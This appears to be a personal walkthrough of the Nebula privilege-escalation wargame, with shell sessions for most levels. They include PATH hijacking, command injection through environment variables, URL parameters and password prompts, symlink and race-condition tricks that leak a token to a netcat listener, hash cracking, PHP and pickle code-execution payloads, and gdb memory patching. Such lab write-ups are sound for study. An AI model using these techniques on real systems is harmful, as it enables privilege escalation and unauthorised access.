---------------- Level 0 - SUID files ---------------- 
level00@nebula:~$ find / -user flag00 -perm -4000 -exec ls -la {} \; 2>/dev/null

---------------- Level 1 - Modifying PATH environment variable ---------------- 

level01@nebula:/home/flag01$ export PATH=/tmp:$PATH
level01@nebula:/home/flag01$ echo getflag>/tmp/echo 
level01@nebula:/home/flag01$ chmod 755 /tmp/echo 
level01@nebula:/home/flag01$ ./flag01 
You have successfully executed getflag on a target account

---------------- Level 2 - User defined environment variable ----------------

level02@nebula:/home/flag02$ export USER=";getflag;echo "
level02@nebula:/home/flag02$ ./flag02 
about to call system("/bin/echo ;getflag;echo  is cool")

You have successfully executed getflag on a target account
is cool

---------------- Level 3 - Running a malicious file via a scheduled cron job ----------------
echo getflag 1>/tmp/a

The cronjob which runs, is running as a "flag" account and executes the file as a "flag" account. Apparently you can only write into /home/flag03 too.. not even into /tmp or wherever.

---------------- Level 4 ----------------
level04@nebula:/home/flag04$ ln -s /home/flag04/token /tmp/link
level04@nebula:/home/flag04$ ./flag04 /tmp/link 
06508b5e-8909-4f38-b630-fdb148a848a2

arvind@si-arvind:~$ ssh flag04@127.0.0.1 -p 2222
flag04@nebula:~$ getflag
You have successfully executed getflag on a target account
flag04@nebula:~$ 

---------------- Level 5 ----------------
tar xvzf backup-19072011.tgz -C /tmp/
There's a private-public key pair for a server called wwwbugs but what about it? No clue.
level05@nebula:/tmp/.ssh$ ssh -i id_rsa flag05@127.0.0.1
flag05@nebula:~$ getflag
You have successfully executed getflag on a target account

---------------- Level 6 ----------------
flag06:ueqwOCnSGdsuM:993:993::/home/flag06:/bin/sh. Probaby have to crack this. Its crypt() and the first 2 chars are the salt. So the salt is 'ue'.
arvind@si-arvind:/media/9f576cb3-3236-42c7-b9bf-869b455b2d87/Installations/john-1.8.0/run$ ./john --show pwd 
flag06:hello:993:993::/home/flag06:/bin/sh

1 password hash cracked, 0 left

level06@nebula:~$ su - flag06
Password: 
flag06@nebula:~$ getflag
You have successfully executed getflag on a target account
flag06@nebula:~$ 

---------------- Level 7 ----------------
Get the port from httpd.conf in /home/flag07. Port forward 7007 and access index.cgi from a browser. Here's the actual injection.
http://127.0.0.1:7007/index.cgi?Host=127.0.0.1|getflag

Get a web display of - You have successfully executed getflag on a target account.
---------------- Level 8 ----------------
capture.pcap. Some kind of telnet login I guess. But I cant login with the creds found using ssh. And there's nothing else running.
password: backdoor...00Rm8.ate

Look at hex view. All the "." are hex 7f = DEL. Which means someone deleted the previous character. 3 DEL = 3 chars deleted. Ends up with a password of backd00Rmate.

flag08@nebula:~$ getflag
You have successfully executed getflag on a target account
flag08@nebula:~$

---------------- Level 9 ----------------
Create a file that has this content - [email {${system(getflag)}}]

level09@nebula:/home/flag09$ ./flag09 /tmp/lev9/a 1
PHP Notice:  Use of undefined constant getflag - assumed 'getflag' in /home/flag09/flag09.php(15) : regexp code on line 1
You have successfully executed getflag on a target account
PHP Notice:  Undefined variable: You have successfully executed getflag on a target account in /home/flag09/flag09.php(15) : regexp code on line 1

---------------- Level 10 ----------------
Uses real user id, meaning the user who actually ran the program. NOT the person who owns the binary. So the soft link idea as in level 4 fails.

- Create a soft link to a file you own so that the access check succeeds: level10@nebula:~$ ln -s /home/flag10/token l1
- Dont yet start the netcat listener.
- Start flag10 as follows: ./flag10 ~level10/l1 10.0.2.2 (127.0.0.1 fails as the connect() happens too quickly). The first connect fails.
- It'll wait and connect again after a while. Before that, change the symlink to point to the "token" file which you dont have access to.
- Now start the netcat listener on 18211. The 2nd connect() after a while connects and spits the token out :). My first ever race condition.
	arvind@si-arvind:~$ nc -l 18211 -v
	Connection from 127.0.0.1 port 18211 [tcp/*] accepted
	.oO Oo.
	615a2ce1-b2b5-4c76-8eed-8aa5c4015c27

flag10@nebula:~$ getflag
You have successfully executed getflag on a target account

---------------- Level 11 -----------------
level11@nebula:~$ ln -s /bin/getflag A
level11@nebula:~$ export PATH=.:$PATH
level11@nebula:~$ gdb -q /home/flag11/flag11 
Reading symbols from /home/flag11/flag11...(no debugging symbols found)...done.
(gdb) br *0x08048a34
Breakpoint 1 at 0x8048a34
(gdb) r
Starting program: /home/flag11/flag11 
Content-Length: 1
@

Breakpoint 1, 0x08048a34 in process ()
(gdb) x/xw $ebp+0x8
0xbfb13d60:	0xbfb13dac
(gdb) x/xw 0xbfb13dac
0xbfb13dac:	0x00c29041
(gdb) set *0xbfb13dac=0x00c20041
(gdb) x/xw 0xbfb13dac
0xbfb13dac:	0x00c20041
(gdb) c
Continuing.
getflag is executing on a non-flag account, this doesn't count
[Inferior 1 (process 8804) exited normally]
(gdb) 

---------------- Level 12 -----------------
level12@nebula:/home/flag12$ telnet localhost 50001
Trying 127.0.0.1...
Connected to localhost.
Escape character is '^]'.
Password: ;getflag>/tmp/oo
Better luck next time
Connection closed by foreign host.
level12@nebula:/home/flag12$ more /tmp/oo 
You have successfully executed getflag on a target account
level12@nebula:/home/flag12$ 

---------------- Level 13 -------------------
level13@nebula:/home/flag13$ cp /home/flag13/flag13 /tmp/
level13@nebula:/home/flag13$ chmod 755 /tmp/flag13 
level13@nebula:/home/flag13$ su - nebula
Password: 
nebula@nebula:~$ cd /tmp/
nebula@nebula:/tmp$ ./flag13 
your token is b705702b-76a8-42b0-8844-3adabbe5ac58
nebula@nebula:/tmp$ logout
level13@nebula:/home/flag13$ logout
Connection to 127.0.0.1 closed.
arvind@si-arvind:~$ ssh flag13@127.0.0.1 -p 2222
flag13@127.0.0.1's password:
flag13@nebula:~$ getflag
You have successfully executed getflag on a target account

---------------- Level 14 ----------------
level14@nebula:/home/flag14$ cat token 
857:g67?5ABBo:BtDA?tIvLDKL{MQPSRQWW.

level14@nebula:/home/flag14$ (perl -e 'print "8457c118-887c-4e40-a5a6-33a25353165"."\xB"'|./flag14 -e;);echo
857:g67?5ABBo:BtDA?tIvLDKL{MQPSRQWW.

arvind@si-arvind:~$ ssh flag14@127.0.0.1 -p 2222
Password:

flag14@nebula:~$ getflag
You have successfully executed getflag on a target account

---------------- Level 15 ----------------

---------------- Level 16 ----------------

---------------- Level 17 ----------------
nc -vvv localhost 10007 < l17_payload

cos
system
(S'/bin/getflag 1>/tmp/1 2>/tmp/2'
tR.

level17@nebula:/tmp$ more 1
You have successfully executed getflag on a target account

---------------- Level 18 ----------------
- Can I force the fopen(pwfile) to fail? That'll set globals.loggedin to 1. So I can then call shell?
- Brute force a 64 character password? :)
- Use the format string vuln with site exec to set globals.loggedin to 1. Then call shell.
- Overwrite password file with blank and then try a blank password to login and then call shell?
- Attach debugger and edit memory

Overwrite password file:  perl -e 'print "x" x 17' | ./flag18 -d password -vvvv
Now login with a known password: login Starting up. Verbose level = 4\ngot [xxxxxxxxxxxxxxxxx] as input\n

(gdb) r
Starting program: /home/flag18/flag18 -c /bin/getflag
/home/flag18/flag18: invalid option -- 'c'
login Starting up. Verbose level = 4
got [xxxxxxxxxxxxxxxxx] as input
shell
process 5211 is executing new program: /bin/dash
getflag is executing on a non-flag account, this doesn't count
[Inferior 1 (process 5211) exited with code 077]

---------------- Level 19 ----------------
Use the fork call and the script l19.c to get this. The code works and I get a flag executed.
